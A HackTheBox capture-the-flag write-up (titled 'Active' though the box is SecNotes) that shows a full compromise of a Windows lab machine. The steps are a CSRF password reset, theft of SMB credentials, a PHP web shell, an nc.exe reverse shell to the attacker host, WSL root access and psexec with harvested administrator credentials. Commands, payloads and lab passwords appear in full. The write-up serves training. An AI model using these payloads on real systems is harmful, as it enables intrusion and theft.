# Active | HackTheBox

### 1. Scan
```bash
┌──(kali㉿kali)-[10.10.14.3]-[~/Desktop]
└─$ sudo nmap -A -p- -T4 10.129.48.94
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 02:29 EDT
Nmap scan report for 10.129.48.94
Host is up, received echo-reply ttl 127 (0.31s latency).
Scanned at 2021-05-29 00:15:33 EDT for 658s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (89%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=5/29%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=60B1C277%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=108%TI=I%TS=U)
SEQ(SP=101%GCD=1%ISR=108%TI=I%II=I%TS=U)
OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54DNW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h19m59s, deviation: 4h02m31s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46296/tcp): CLEAN (Timeout)
|   Check 2 (port 19155/tcp): CLEAN (Timeout)
|   Check 3 (port 54126/udp): CLEAN (Timeout)
|   Check 4 (port 20279/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2021-05-28T21:25:50-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-29T04:25:51
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   302.23 ms 10.10.14.1
2   311.84 ms 10.129.48.94

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 29 00:26:31 2021 -- 1 IP address (1 host up) scanned in 659.19 seconds
```
The machine is Windows, running a couple of web servers and SMB.

### 2. Enumerate
Go to web server on port 80. There is a login page, and a sign-up page which prompts for a username and password. Upon making an account, access is granted to the secure notes website.
The page has the following functionality:
- Add a note
- Change password
- Sign out
- Contact
  
Up top it says: "Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII). Please contact tyler@secnotes.htb using the contact link below with any questions. Using the "Contact" form, it is possible to send a message to Tyler.
  
Try sending a link to a controlled page: http://10.10.14.3/test.html  
Shortly after recieve a response in the nc listener.
```bash
┌──(kali㉿kali)-[10.10.14.3]-[~/Desktop]
└─$ sudo nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.48.94] 50984
GET /test.html HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
Host: 10.10.14.3
Connection: Keep-Alive
```
The fact that we can direct Tyler to click links means it is possible to perform CSRF and reset their password.

### 3. Access Tyler's account
Firstly get the POST request for the password, which looks something like this:
```
POST /change_pass.php HTTP/1.1
Host: 10.129.48.94
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://10.129.48.94
Connection: close
Referer: http://10.129.48.94/change_pass.php
Cookie: PHPSESSID=1qe92gr8o3bisgjg01h95mba8c
Upgrade-Insecure-Requests: 1

password=123456&confirm_password=123456&submit=submit
```
The request can be converted to a GET in BurpSuite, and then sent in a message to Tyler. This message looks like: 
http://10.129.48.94/change_pass.php?password=123456&confirm_password=123456&submit=submit.  
  
Wait a few minutes then login with `tyler:123456`. Access is granted.  
Once in, Tyler has three notes. One is a recipe for "Mimi's Sticky Buns", one is a list of years, and one is a note with what looks to be SMB credentials:
```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```
The creds do indeed give access to SMB.
```bash
┌──(kali㉿kali)-[10.10.14.3]-[~/Desktop]
└─$ crackmapexec smb 10.129.48.94 -u tyler -p "92g\!mA8BGjOirkL%OG*&" --shares
SMB         10.129.48.94    445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         10.129.48.94    445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*& 
SMB         10.129.48.94    445    SECNOTES         [+] Enumerated shares
SMB         10.129.48.94    445    SECNOTES         Share           Permissions     Remark
SMB         10.129.48.94    445    SECNOTES         -----           -----------     ------
SMB         10.129.48.94    445    SECNOTES         ADMIN$                          Remote Admin
SMB         10.129.48.94    445    SECNOTES         C$                              Default share
SMB         10.129.48.94    445    SECNOTES         IPC$                            Remote IPC
SMB         10.129.48.94    445    SECNOTES         new-site        READ,WRITE
```
Access the share that is read/writable.
```bash
┌──(kali㉿kali)-[10.10.14.3]-[~/Desktop]
└─$ smbclient -U tyler \\\\secnotes.htb\\new-site                                                                                                                                            1 ⨯
Enter WORKGROUP\tyler's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 00:49:56 2021
  ..                                  D        0  Sat May 29 00:49:56 2021
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018

                7736063 blocks of size 4096. 3318466 blocks available
```
This appears to be the webroot for the server running on port 8808.

### 4. Get a shell
Usually IIS is running asp/x, but no webshells work with those formats. PHP works though. Can upload something simple to start with, like `<?php echo shell_exec("whoami"); ?>` which returns "secnotes\tyler".
```bash
┌──(kali㉿kali)-[10.10.14.3]-[~/Desktop]
└─$ curl http://secnotes.htb:8808/shell.php
secnotes\tyler
```
Modify the file slightly so it runs a command from a parameter instead: `<?php echo shell_exec($_GET["cmd"]); ?>`
Upload nc.exe to the machine over smb.
```bash
smb: \jack\> ls
  .                                   D        0  Sat May 29 02:04:40 2021
  ..                                  D        0  Sat May 29 02:04:40 2021
  shell.php                           A       40  Sat May 29 02:03:27 2021

                7736063 blocks of size 4096. 3321737 blocks available
smb: \jack\> put nc.exe
putting file nc.exe as \jack\nc.exe (27.1 kb/s) (average 15.1 kb/s)
```
...and then call it with arguments to connect back and establish a reverse shell:
http://secnotes.htb:8808/jack/shell.php?cmd=nc.exe%2010.10.14.3%209999%20-e%20cmd.exe
  
Get a shell in the listener.
```bash
┌──(kali㉿kali)-[10.10.14.3]-[~/Desktop]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.64.38] 51199
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site\jack>whoami
whoami
secnotes\tyler
```

### 5. Enumerate from user
The account is fairly standard, no obvious privesc routes.  
Check out the C:\ directory.

```shell
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 5D3C-D1D6

 Directory of C:\

06/21/2018  03:07 PM    <DIR>          Distros
06/21/2018  06:47 PM    <DIR>          inetpub
06/22/2018  02:09 PM    <DIR>          Microsoft
04/11/2018  04:38 PM    <DIR>          PerfLogs
06/21/2018  08:15 AM    <DIR>          php7
01/26/2021  03:39 AM    <DIR>          Program Files
01/26/2021  03:38 AM    <DIR>          Program Files (x86)
06/21/2018  03:07 PM       201,749,452 Ubuntu.zip
06/21/2018  03:00 PM    <DIR>          Users
01/26/2021  03:38 AM    <DIR>          Windows
               1 File(s)    201,749,452 bytes
               9 Dir(s)  13,605,556,224 bytes free
```
The presence of Ubuntu.zip may hint towards WSL being present on the system.

### 6. Get to root?
To activate WSL, run it from Powershell.
```shell
C:\inetpub\new-site\jack>powershell -c wsl
mesg: ttyname failed: Inappropriate ioctl for device
id
uid=0(root) gid=0(root) groups=0(root)
which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
root@SECNOTES:~#
```

### 7. Enumerate in WSL
The WSL system doesn't have too much to it. Mounted access to the filesystem does not provide any extra access that Tyler did not have before. However, there is content in root's .bash_history that appears to be administrator smb credentials.
```bash
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
```

### 8. Escalate to SYSTEM
With Administrator creds, use psexec to go straight to nt authority/system.
```bash
┌──(kali㉿kali)-[10.10.14.3]-[~/Desktop]
└─$ impacket-psexec Administrator:u6\!4ZwgwOM#^OBf#Nwnh@secnotes.htb
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on secnotes.htb.....
[*] Found writable share ADMIN$
[*] Uploading file HcauErhI.exe
[*] Opening SVCManager on secnotes.htb.....
[*] Creating service hOia on secnotes.htb.....
[*] Starting service hOia.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```